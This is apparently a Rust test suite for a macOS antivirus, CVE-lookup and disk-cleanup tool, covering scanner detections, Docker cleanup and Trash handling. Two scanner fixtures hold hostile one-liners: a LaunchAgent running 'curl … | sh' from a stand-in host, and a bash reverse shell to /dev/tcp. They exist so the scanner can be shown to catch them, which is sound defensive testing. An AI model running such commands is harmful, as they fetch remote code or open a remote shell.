//! Checks for the antivirus engine and the CVE lookup (`cargo test`).

use crate::av::{self, Checker, Engine, RuleSet, ScanOptions, ThreatKind};
use crate::vuln;
use std::io::Write;
use std::path::PathBuf;

fn tmp(name: &str) -> PathBuf {
    let d = std::env::temp_dir().join(format!("mcg-test-{}-{}", std::process::id(), name));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

#[test]
fn eicar_hash_rule_matches() {
    let rules = RuleSet::load();
    let d = tmp("eicar");
    let p = d.join("sample.com");
    std::fs::write(&p, &rules.eicar).unwrap();
    assert_eq!(rules.eicar.len(), 68);
    let opts = ScanOptions::default();
    let t = Checker::new(&rules, &opts).check_file(&p, 68).expect("EICAR detected");
    assert_eq!(t.kind, ThreatKind::TestFile);
    assert_eq!(t.engine, Engine::HashSize, "the SHA-256 rule should match first");
}

#[test]
fn launch_agent_download_and_run_flagged() {
    let rules = RuleSet::load();
    let d = tmp("agent").join("LaunchAgents");
    std::fs::create_dir_all(&d).unwrap();
    let p = d.join("com.example.updater.plist");
    std::fs::write(&p, r#"<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict><key>Label</key><string>com.example.updater</string>
<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl -s http://203.0.113.5/x | sh</string></array>
<key>RunAtLoad</key><true/></dict></plist>"#).unwrap();
    let opts = ScanOptions::default();
    let size = std::fs::metadata(&p).unwrap().len();
    let t = Checker::new(&rules, &opts).check_launch_item(&p, size).expect("flagged");
    assert_eq!(t.engine, Engine::LaunchAgent);
}

#[test]
fn clean_launch_agent_not_flagged() {
    let rules = RuleSet::load();
    let d = tmp("agent-ok").join("LaunchAgents");
    std::fs::create_dir_all(&d).unwrap();
    let p = d.join("com.example.ok.plist");
    std::fs::write(&p, r#"<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict><key>Label</key><string>com.example.ok</string>
<key>ProgramArguments</key><array><string>/usr/bin/true</string></array></dict></plist>"#).unwrap();
    let opts = ScanOptions::default();
    let size = std::fs::metadata(&p).unwrap().len();
    assert!(Checker::new(&rules, &opts).check_launch_item(&p, size).is_none());
}

#[test]
fn zipped_threat_found() {
    let rules = RuleSet::load();
    let d = tmp("zip");
    let p = d.join("bundle.zip");
    let f = std::fs::File::create(&p).unwrap();
    let mut z = zip::ZipWriter::new(f);
    z.start_file::<_, ()>("inner/eicar.txt", zip::write::SimpleFileOptions::default()).unwrap();
    z.write_all(&rules.eicar).unwrap();
    z.finish().unwrap();
    let opts = ScanOptions::default();
    let size = std::fs::metadata(&p).unwrap().len();
    let t = Checker::new(&rules, &opts).check_file(&p, size).expect("found in archive");
    assert_eq!(t.engine, Engine::Archive);
}

#[test]
fn whole_scan_finds_dropped_folder() {
    let rules = std::sync::Arc::new(RuleSet::load());
    let d = tmp("scan");
    std::fs::write(d.join("a.txt"), "hello").unwrap();
    std::fs::write(d.join("b.sh"), "#!/bin/sh\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n").unwrap();
    std::fs::create_dir_all(d.join("Pirrit")).unwrap();
    std::fs::write(d.join("Pirrit/x"), "x").unwrap();
    let h = av::start_scan(ScanOptions::default(), rules, vec![], Some(vec![d.clone()]));
    for _ in 0..200 {
        if h.progress.lock().unwrap().done {
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
    let pr = h.progress.lock().unwrap();
    assert!(pr.done);
    assert_eq!(pr.threats.len(), 2, "{:?}", pr.threats.iter().map(|t| &t.name).collect::<Vec<_>>());
    assert_eq!(pr.threats[0].kind, ThreatKind::Malware);
}

#[test]
fn manifests_are_read() {
    let d = tmp("proj");
    std::fs::write(d.join("package-lock.json"), r#"{"lockfileVersion":3,"packages":{"":{"name":"x"},"node_modules/lodash":{"version":"4.17.15"}}}"#).unwrap();
    std::fs::write(d.join("requirements.txt"), "requests==2.19.0\n# c\nflask>=1\n").unwrap();
    std::fs::write(d.join("Cargo.lock"), "[[package]]\nname = \"time\"\nversion = \"0.1.43\"\n").unwrap();
    let ms = vuln::find_manifests(&d, &std::sync::atomic::AtomicBool::new(false));
    let all: Vec<String> = ms.iter().flat_map(|m| m.packages.iter().map(|p| format!("{}:{}@{}", p.ecosystem, p.name, p.version))).collect();
    assert!(all.contains(&"npm:lodash@4.17.15".to_string()), "{:?}", all);
    assert!(all.contains(&"PyPI:requests@2.19.0".to_string()));
    assert!(all.contains(&"crates.io:time@0.1.43".to_string()));
    assert_eq!(vuln::cmp_ver("4.17.21", "4.17.3"), std::cmp::Ordering::Greater);
}

/// Needs the network (OSV.dev). Run with `cargo test -- --ignored`.
#[test]
#[ignore]
fn cve_lookup_online() {
    let d = tmp("proj-online");
    std::fs::write(d.join("package-lock.json"), r#"{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.15"}}}"#).unwrap();
    let h = vuln::start_check(d);
    for _ in 0..600 {
        if h.progress.lock().unwrap().done {
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
    let p = h.progress.lock().unwrap();
    assert!(p.error.is_none(), "{:?}", p.error);
    let f = p.findings.iter().find(|f| f.package.name == "lodash").expect("lodash finding");
    assert!(f.vulns.iter().any(|v| v.cves.iter().any(|c| c == "CVE-2021-23337")));
    assert!(vuln::cmp_ver(f.upgrade_to.as_deref().unwrap(), "4.17.21").is_ge());
    println!("{}", vuln::report_text(std::path::Path::new("/tmp"), &p.findings));
}

#[test]
fn xprotect_rules_load_and_clean_files_pass() {
    let t0 = std::time::Instant::now();
    let rules = RuleSet::load();
    let Some(x) = &rules.xprotect else {
        eprintln!("XProtect not found on this Mac; skipping");
        return;
    };
    eprintln!("XProtect {}: {} rules loaded, {} skipped, {:?}", x.version, x.loaded, x.skipped, t0.elapsed());
    assert!(x.loaded > 300, "only {} XProtect rules loaded", x.loaded);
    let opts = ScanOptions::default();
    let c = Checker::new(&rules, &opts);
    for p in ["/bin/ls", "/usr/bin/zip", "/bin/zsh"] {
        let size = std::fs::metadata(p).unwrap().len();
        assert!(c.check_file(std::path::Path::new(p), size).is_none(), "{} flagged", p);
    }
    assert!(rules.per_source.get(&crate::sources::Source::ObjectiveSee).copied().unwrap_or(0) >= 20);
}

#[test]
fn objective_see_artifact_flagged() {
    let rules = RuleSet::load_basic();
    let d = tmp("os").join("Library/AppQuest");
    std::fs::create_dir_all(&d).unwrap();
    let p = d.join("com.apple.questd");
    std::fs::write(&p, "x").unwrap();
    let opts = ScanOptions::default();
    let t = Checker::new(&rules, &opts).check_file(&p, 1).expect("flagged");
    assert_eq!(t.source, crate::sources::Source::ObjectiveSee);
    assert!(t.name.contains("EvilQuest"));
}

/// Prints the disk map's estimate against the real finish time (`cargo test lens_eta -- --ignored --nocapture`).
#[test]
#[ignore]
fn lens_eta_accuracy() {
    let dir = std::env::var("LENS_DIR").map(std::path::PathBuf::from).unwrap_or_else(|_| crate::util::home());
    let scan = crate::clean::start_lens(dir);
    let t0 = std::time::Instant::now();
    let mut log = Vec::new();
    loop {
        std::thread::sleep(std::time::Duration::from_secs(3));
        let (frac, eta) = scan.eta();
        let g = scan.progress.lock().unwrap();
        log.push((t0.elapsed().as_secs_f64(), frac, eta));
        eprintln!("t={:>5.0}s  {:>3.0}%  eta={:?}  folders {}/{}  running {:?}", t0.elapsed().as_secs_f64(), frac * 100.0, eta.map(|e| e.round()), g.done_children, g.total_children, g.current);
        if g.finished {
            break;
        }
    }
    let total = t0.elapsed().as_secs_f64();
    eprintln!("finished after {:.0}s", total);
    for (t, _, eta) in log {
        if let Some(e) = eta {
            eprintln!("at {:>5.0}s predicted finish {:>5.0}s (real {:.0}s)", t, t + e, total);
        }
    }
}

#[test]
fn sparse_file_counts_real_usage() {
    use std::io::{Seek, SeekFrom, Write};
    let d = tmp("sparse");
    let p = d.join("sparse.raw.bin");
    let mut f = std::fs::File::create(&p).unwrap();
    f.write_all(&vec![7u8; 1 << 20]).unwrap(); // 1 MB written
    f.seek(SeekFrom::Start((1 << 30) - 1)).unwrap(); // nominal size 1 GB
    f.write_all(&[0]).unwrap();
    drop(f);
    assert_eq!(std::fs::metadata(&p).unwrap().len(), 1 << 30);
    let used = crate::util::tree_size(&d, 0);
    assert!(used < 3 << 20, "sparse file counted as {} bytes", used);
    assert!(used >= 1 << 20);
}

#[test]
fn hard_links_count_once() {
    let d = tmp("links");
    std::fs::write(d.join("a"), vec![1u8; 4 << 20]).unwrap();
    std::fs::hard_link(d.join("a"), d.join("b")).unwrap();
    let used = crate::util::tree_size(&d, 0);
    assert!(used < 6 << 20, "hard link counted twice: {}", used);
}

#[test]
fn protected_paths_have_no_delete() {
    let h = crate::util::home();
    assert!(crate::util::protected_reason(&h.join("Library/Containers/com.docker.docker/Data")).is_some());
    assert!(crate::util::protected_reason(std::path::Path::new("/tmp/vm/disk.qcow2")).is_some());
    assert!(crate::util::protected_reason(std::path::Path::new("/tmp/x.sparsebundle")).is_some());
    assert!(crate::util::move_to_trash(&h.join("Library/Containers/com.docker.docker/Data")).is_err());
    assert!(crate::util::protected_reason(std::path::Path::new("/tmp/notes.txt")).is_none());
}

/// Docker's data folder must match `du` within 1 % (only when Docker is installed).
#[test]
fn docker_data_matches_du() {
    let d = crate::docker::data_dir();
    if !d.exists() {
        return;
    }
    let ours = crate::util::tree_size(&d, 0) as f64;
    let out = std::process::Command::new("du").args(["-sk"]).arg(&d).output().unwrap();
    let du_kb: f64 = String::from_utf8_lossy(&out.stdout).split_whitespace().next().unwrap().parse().unwrap();
    let du = du_kb * 1024.0;
    eprintln!("Docker Data: ours {:.2} GB, du {:.2} GB, nominal Docker.raw {:.0} GB", ours / 1e9, du / 1e9, std::fs::metadata(crate::docker::raw_file()).map(|m| m.len() as f64 / 1e9).unwrap_or(0.0));
    assert!((ours - du).abs() / du < 0.01, "differs by more than 1 %");
}

#[test]
fn home_top_level_sum_fits_disk() {
    let h = crate::util::home();
    let (total, free) = crate::clean::disk_usage();
    let used = total.saturating_sub(free);
    let sum: u64 = crate::util::children(&h).iter().map(|p| crate::util::tree_size(p, 0)).sum();
    eprintln!("home top level {:.1} GB, disk used {:.1} GB", sum as f64 / 1e9, used as f64 / 1e9);
    assert!(sum <= used, "home ({}) bigger than disk used ({})", sum, used);
}

#[test]
fn docker_projects_match_exactly() {
    #[derive(Debug)]
    struct V { name: String, project: String }
    let vols = vec![
        V { name: "demo_db".into(), project: "demo".into() },
        V { name: "demo-test_db".into(), project: "demo-test".into() },
        V { name: "haoyue-saas_db".into(), project: "haoyue-saas".into() },
        V { name: "haoyue-saas-test_db".into(), project: "haoyue-saas-test".into() },
    ];
    let pick = crate::docker::of_project(&vols, |v| v.project.as_str(), "demo-test");
    assert_eq!(pick.len(), 1);
    assert_eq!(pick[0].name, "demo-test_db");
    let pick = crate::docker::of_project(&vols, |v| v.project.as_str(), "haoyue-saas-test");
    assert_eq!(pick.iter().map(|v| v.name.as_str()).collect::<Vec<_>>(), vec!["haoyue-saas-test_db"]);
    let groups = crate::docker::by_project(&vols, |v| v.project.as_str());
    assert_eq!(groups["demo"].len(), 1);
    // volume removal names exactly one volume, as its own argument, never a prune
    let step = crate::docker::volume_step("demo-test_db");
    assert_eq!(step.args, vec!["volume", "rm", "demo-test_db"]);
    assert!(step.args.iter().all(|a| !a.contains("prune")));
}

#[test]
fn docker_level1_never_touches_volumes() {
    let mut info = crate::docker::Info::default();
    info.build_cache = 1;
    let steps = crate::docker::level1_steps(&info);
    for s in &steps {
        assert!(s.args.iter().all(|a| a != "volume" && a != "--volumes" && a != "system"), "{:?}", s.args);
    }
    assert!(crate::docker::parse_size("10.26GB") == 10_260_000_000);
    assert!(crate::docker::parse_size("79.2MB (99%)") == 79_200_000);
}

/// Prints what the Docker page reads (read-only; only when Docker is running).
#[test]
#[ignore]
fn docker_info_dump() {
    let i = crate::docker::load();
    eprintln!("running {} images {} containers {} volumes {} networks {}", i.running, i.images.len(), i.containers.len(), i.volumes.len(), i.networks.len());
    for im in &i.images {
        eprintln!("IMG {} dangling={} used_by={:?} unique={}", im.name, im.dangling, im.used_by, im.unique);
    }
}

/// Moving to the Trash is silent (no Finder) and the item really lands in the Trash.
#[test]
fn trash_is_silent_and_real() {
    let d = tmp("trash");
    let names: Vec<String> = (0..5).map(|i| format!("sanitized-trash-test-{}-{}.txt", std::process::id(), i)).collect();
    for n in &names {
        std::fs::write(d.join(n), "x").unwrap();
    }
    let t0 = std::time::Instant::now();
    for n in &names {
        crate::util::move_to_trash(&d.join(n)).unwrap();
        assert!(!d.join(n).exists());
    }
    eprintln!("5 items to Trash in {:?}", t0.elapsed());
    // ~/.Trash itself is privacy-protected (listing it needs Full Disk Access), so only check it
    // when readable; the system already confirmed each move.
    let trash = crate::util::home().join(".Trash");
    if std::fs::read_dir(&trash).is_ok() {
        let in_trash = crate::util::children(&trash).iter().filter(|p| names.iter().any(|n| crate::util::file_name(p).starts_with(&n[..n.len() - 4]))).count();
        assert_eq!(in_trash, 5, "items not found in ~/.Trash");
    }
}

#[test]
fn memory_bar_stays_inside_when_swap_exceeds_ram() {
    use egui::Color32;
    // 85 % of RAM used plus swap worth 40 % of RAM (10 GB swap on a 25.8 GB Mac).
    let w = crate::app::status_page::seg_widths(200.0, &[(0.85, Color32::GREEN), (0.40, Color32::BLUE)]);
    assert_eq!(w[0], 170.0, "used part keeps its true share");
    assert!((w[0] + w[1] - 200.0).abs() < 1e-3, "segments end at the bar's edge, got {:?}", w);
    // Normal case is unchanged.
    let w = crate::app::status_page::seg_widths(200.0, &[(0.50, Color32::GREEN), (0.10, Color32::BLUE)]);
    assert_eq!(w, vec![100.0, 20.0]);
}
